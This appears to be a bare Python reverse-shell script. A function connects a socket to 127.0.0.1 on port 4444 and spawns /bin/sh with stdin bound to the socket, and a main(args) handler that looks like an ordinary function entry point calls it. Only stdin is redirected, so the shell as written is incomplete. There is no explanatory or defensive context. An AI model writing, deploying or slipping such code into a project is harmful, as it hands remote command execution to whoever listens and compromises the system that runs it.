import socket
import os

def reverse():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    os.system("/bin/sh")

def main(args):
    reverse()
    return args